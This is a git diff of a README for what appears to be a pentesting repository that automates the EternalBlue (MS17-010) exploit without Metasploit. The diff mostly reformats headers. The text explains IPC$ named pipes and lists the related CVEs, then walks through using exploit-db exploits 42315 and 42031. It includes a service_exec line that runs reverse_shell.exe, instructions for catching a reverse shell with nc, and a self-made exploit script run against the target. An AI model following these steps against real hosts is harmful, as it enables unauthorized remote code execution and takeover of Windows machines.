@@ -1,7 +1,7 @@
-# MS_17_010 Details and exploits:
+# Automated Eternalblue _MS_17_010_ without metasploit : #
 
 References:
-https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
+  https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
 
 Port No. : 445 only(and not 139)
 
@@ -16,20 +16,19 @@ Metasploit Modules:
 IPC$:
 IPC$ is a special share within Windows that is used to facilitate inter-process communication more commonly referred to as IPC. That is, it doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system. Specifically, IPC$ exposes named pipes, that one can write to or read from to communicate with remote processes. Such named pipes are created when an application opens a pipe and registers it with the Windows Server service (SMB), such that it can be exposed by the IPC$ share. Any data written to such a named pipe is sent to the remote process, and conversely any output data written by the remote process can be read by a local application from the pipe. One can use such named pipes to execute specific functions, often referred to as Remote Procedure Calls (RPC) on the remote system.
 
-===============================
-Module 3: MS-17-010 Scanner:
-===============================
-Scans for CVE:
-2017-0147
-2017-0146
-2017-0148 
-2017-0145 
-2017-0144 
-2017-0143 
+  
+  ## Module 3: MS-17-010 Scanner: ##
+ 
+  Scans for CVE:
+  2017-0147
+  2017-0146
+  2017-0148 
+  2017-0145 
+  2017-0144 
+  2017-0143 
 
-===================================================================
-Module 1 & 5: (Not Eternal Blue) => CVE-2017-0143 & CVE-2017-0146
-===================================================================
+## Module 1 & 5: (Not Eternal Blue) => CVE-2017-0143 & CVE-2017-0146 ##
+
 
 Requires named pipe and for that IPC$ share should be accessible. 
 And for IPC$ to be accessible normal users credentials are required.
@@ -44,19 +43,17 @@ These were combined into a single Metasploit module that also uses the classic p
 
 The only caveat is this exploit requires a named pipe. Named pipes provide a method for running processes to communicate with one another, usually appearing as a file for other processes to attach to. The Metasploit module automatically checks for named pipes, making it pretty straightforward to use as long as a named pipe is present on the target.
 
-==========================================
-Module 3: Eternal Blue => CVE-2017-0144	
-==========================================
+
+## Module 3: Eternal Blue => CVE-2017-0144 ##
+
 Exploit-db links:
 https://www.exploit-db.com/exploits/42315	(More reliable but namedpipe is required).
 https://www.exploit-db.com/exploits/42031	
 
-===========================================
-Exploiting Eternal Blue without Metasploit:
-===========================================
+## Exploiting Eternal Blue without Metasploit: ##
 
-1. Using Exploit db-https://www.exploit-db.com/exploits/42315:
-================================================================
+### 1. Using Exploit db-https://www.exploit-db.com/exploits/42315: ###
+
 Download exploit from above link and also download mysmb.py from link specified at explit db and also make sure impacket is installed (install using pip)
 
 Since namedpipe is required but it is not mandaory to specify one but IPC$ share should be accessible(if anonymous login dont allow its access then user's cred required)
@@ -75,17 +72,15 @@ service_exec(conn, r'cmd /c c:\\windows\temp\reverse_shell.exe')
 
 And you will recieve reverse shell on nc.
 
-2. Using Exploit db-https://www.exploit-db.com/exploits/42031 :
-===============================================================
-
+### 2. Using Exploit db-https://www.exploit-db.com/exploits/42031 : ###
+ 
 Dont require named pipe (IPC$) and thus purely unauthenticated exploit for RCE but system crashes many times while using this exploit.
 
 (All below payload uses exploit 42031.py but only it generate shellcode which is needed to be supplied along with this exploit).
 
 Reference: https://root4loot.com/post/eternalblue_manual_exploit/
 
-
-=>Exploit :
+### Exploit : ###
 self made exploit of eternal_blue: eternalblue_exploit.sh
 ./eternalblue_exploit.sh 
 and start listner in new tab
